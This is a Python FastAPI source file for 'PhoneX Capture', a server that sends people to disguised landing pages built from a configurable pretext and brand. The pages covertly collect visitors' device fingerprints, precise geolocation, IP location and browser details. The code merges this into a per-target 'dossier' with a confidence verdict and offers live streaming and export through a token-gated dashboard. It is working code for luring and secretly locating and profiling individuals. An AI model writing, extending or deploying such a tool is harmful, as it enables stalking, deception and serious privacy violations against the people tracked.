from __future__ import annotations

import asyncio
import json
from pathlib import Path
from typing import Any

from fastapi import Depends, FastAPI, Header, HTTPException, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from .. import analyze
from ..config import Config
from ..http import HttpClient
from ..providers.ip_geo import lookup_ip
from ..storage import Storage
from ..utils import jload, mask_number, utcnow

BASE_DIR = Path(__file__).resolve().parent
TEMPLATES = Jinja2Templates(directory=str(BASE_DIR / "templates"))

def client_ip(request: Request) -> str:
    forwarded = request.headers.get("x-forwarded-for", "")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.client.host if request.client else ""

def create_app(config: Config) -> FastAPI:
    app = FastAPI(title="PhoneX Capture", docs_url=None, redoc_url=None)
    storage = Storage(config.capture.db_path)
    app.state.storage = storage
    app.state.config = config

    app.mount("/static", StaticFiles(directory=str(BASE_DIR / "static")), name="static")

    def auth(
        k: str = Query(default=""),
        x_dash_token: str = Header(default=""),
    ) -> None:
        expected = config.capture.dashboard_token
        if not expected:
            return
        if k != expected and x_dash_token != expected:
            raise HTTPException(status_code=401, detail="unauthorized")

    def recompute(token: str, ip: str) -> dict[str, Any]:
        """إعادة حساب ملف الهدف بعد كل تفاعل ودمجه تراكمياً."""
        fingerprints = storage.list_fingerprints(token)
        locations = storage.list_locations(token)
        events = storage.list_events(token)

        ip_geo: dict[str, Any] = {}
        for event in reversed(events):
            if event["kind"] == "ip_geo" and isinstance(event["data"], dict):
                ip_geo = event["data"]
                break

        latest = fingerprints[-1]["data"] if fingerprints else {}
        fresh = analyze.dossier(latest, ip_geo, locations)
        fresh["stage"] = analyze.stage_of(events)
        fresh["fp_count"] = len(fingerprints)
        fresh["loc_count"] = len(locations)
        fresh["first_seen"] = events[0]["ts"] if events else utcnow()

        previous = storage.get_dossier(token)
        if previous:
            fresh = analyze.merge(previous["data"], fresh)

        storage.set_dossier(token, fresh)
        storage.add_event(
            token,
            "dossier",
            {"confidence": fresh["confidence"], "verdict": fresh["verdict"], "stage": fresh["stage"]},
            ip,
        )
        return fresh

    # ── landing ─────────────────────────────────────────────────
    @app.get("/c/{token}", response_class=HTMLResponse)
    async def landing(request: Request, token: str) -> HTMLResponse:
        session = storage.get_session(token)
        if session is None:
            return HTMLResponse(
                "<h1 style='font-family:sans-serif'>الرابط غير صالح أو منتهي</h1>",
                status_code=404,
            )
        ip = client_ip(request)
        storage.touch_session(token, ip, request.headers.get("user-agent", ""))
        storage.add_event(
            token,
            "open",
            {"ua": request.headers.get("user-agent", ""), "ref": request.headers.get("referer", "")},
            ip,
        )
        recompute(token, ip)
        return TEMPLATES.TemplateResponse(
            "landing.html",
            {
                "request": request,
                "token": token,
                "base": config.capture.public_base.rstrip("/"),
                "masked": mask_number(session["number"]),
                "title": config.capture.pretext_title,
                "subtitle": config.capture.pretext_subtitle,
                "brand": config.capture.brand,
                "geo": config.capture.geolocation,
            },
        )

    # ── ingest ──────────────────────────────────────────────────
    @app.post("/c/{token}/fp")
    async def ingest_fp(request: Request, token: str) -> JSONResponse:
        if storage.get_session(token) is None:
            raise HTTPException(status_code=404, detail="unknown session")
        payload = jload(await request.body(), {})
        ip = client_ip(request)
        storage.add_fingerprint(token, payload, ip)
        storage.add_event(token, "fingerprint", {"stage": payload.get("stage", "?")}, ip)
        dossier = recompute(token, ip)
        return JSONResponse({"ok": True, "confidence": dossier["confidence"], "verdict": dossier["verdict"]})

    @app.post("/c/{token}/geo")
    async def ingest_geo(request: Request, token: str) -> JSONResponse:
        if storage.get_session(token) is None:
            raise HTTPException(status_code=404, detail="unknown session")
        payload = jload(await request.body(), {})
        ip = client_ip(request)
        try:
            lat = float(payload.get("lat"))
            lon = float(payload.get("lon"))
        except (TypeError, ValueError):
            raise HTTPException(status_code=400, detail="bad coordinates")
        acc = float(payload.get("acc") or 0.0)
        storage.add_location(token, lat, lon, acc, payload)
        storage.add_event(token, "location", {"lat": lat, "lon": lon, "acc": acc}, ip)
        dossier = recompute(token, ip)
        return JSONResponse({"ok": True, "precision": dossier["geo_precision"]})

    @app.post("/c/{token}/event")
    async def ingest_event(request: Request, token: str) -> JSONResponse:
        if storage.get_session(token) is None:
            raise HTTPException(status_code=404, detail="unknown session")
        payload = jload(await request.body(), {})
        ip = client_ip(request)
        storage.add_event(token, str(payload.get("kind", "custom")), payload, ip)
        recompute(token, ip)
        return JSONResponse({"ok": True})

    @app.get("/c/{token}/ip")
    async def ip_info(request: Request, token: str) -> JSONResponse:
        if storage.get_session(token) is None:
            raise HTTPException(status_code=404, detail="unknown session")
        ip = client_ip(request)
        async with HttpClient(timeout=8.0, retries=1) as http:
            data = await lookup_ip(http, ip)
        if data:
            storage.add_event(token, "ip_geo", data, ip)
            recompute(token, ip)
        return JSONResponse({"ip": ip, "geo": data})

    # ── dashboard ───────────────────────────────────────────────
    @app.get("/", response_class=HTMLResponse)
    async def index(request: Request, k: str = Query(default="")) -> HTMLResponse:
        return TEMPLATES.TemplateResponse(
            "dashboard.html",
            {"request": request, "token": k, "brand": config.capture.brand},
        )

    @app.get("/api/sessions", dependencies=[Depends(auth)])
    async def api_sessions(limit: int = 100) -> JSONResponse:
        return JSONResponse({"sessions": storage.list_sessions(limit)})

    @app.get("/api/session/{token}", dependencies=[Depends(auth)])
    async def api_session(token: str) -> JSONResponse:
        bundle = storage.bundle(token)
        if bundle["session"] is None:
            raise HTTPException(status_code=404, detail="not found")
        return JSONResponse(bundle)

    @app.get("/api/dossier/{token}", dependencies=[Depends(auth)])
    async def api_dossier(token: str) -> JSONResponse:
        if storage.get_session(token) is None:
            raise HTTPException(status_code=404, detail="not found")
        stored = storage.get_dossier(token)
        if stored is None:
            return JSONResponse({"dossier": None})
        return JSONResponse({"dossier": stored["data"], "ts": stored["ts"]})

    @app.get("/api/stream/{token}", dependencies=[Depends(auth)])
    async def api_stream(token: str, request: Request) -> StreamingResponse:
        async def generator():
            last = 0
            idle = 0
            while True:
                if await request.is_disconnected():
                    break
                events = storage.list_events(token, after=last)
                for event in events:
                    last = max(last, int(event["id"]))
                    yield f"data: {json.dumps(event, ensure_ascii=False, default=str)}\n\n"
                if events:
                    idle = 0
                else:
                    idle += 1
                    if idle % 15 == 0:
                        yield ": ping\n\n"
                await asyncio.sleep(1.0)

        return StreamingResponse(
            generator(),
            media_type="text/event-stream",
            headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
        )

    @app.get("/api/export/{token}", dependencies=[Depends(auth)])
    async def api_export(token: str) -> PlainTextResponse:
        bundle = storage.bundle(token)
        if bundle["session"] is None:
            raise HTTPException(status_code=404, detail="not found")
        bundle["exported_at"] = utcnow()
        return PlainTextResponse(
            json.dumps(bundle, ensure_ascii=False, indent=2, default=str),
            media_type="application/json",
            headers={"Content-Disposition": f'attachment; filename="phonex-{token}.json"'},
        )

    @app.get("/healthz")
    async def healthz() -> dict[str, Any]:
        return {"ok": True, "ts": utcnow()}

    @app.on_event("shutdown")
    async def shutdown() -> None:
        storage.close()

    return app